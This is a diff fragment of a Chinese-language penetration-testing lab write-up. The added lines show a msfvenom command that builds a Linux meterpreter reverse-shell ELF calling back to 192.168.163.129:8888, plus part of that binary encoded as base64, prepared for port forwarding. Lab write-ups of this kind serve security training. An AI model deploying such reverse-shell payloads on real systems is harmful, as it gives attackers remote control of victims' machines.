@@ -271,7 +271,14 @@ echo '    sock.close()' >> scan.py
 ![](attachments/Pasted%20image%2020230305195138.png)
 
 ssh远程转发失效那就考虑msf来做portfwd，和TF1一样先生成一个shell
+`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.163.129 LPORT=8888 -f elf -o TF3shell.elf`
+然后转为base64
 
+![](attachments/Pasted%20image%2020230305200231.png)
+
+```shell
+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1towKijgWgCACK4ieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZsmqwA82AhcB4Av/huAEAAAC7AQAAAM2Af
+```
 
 
 
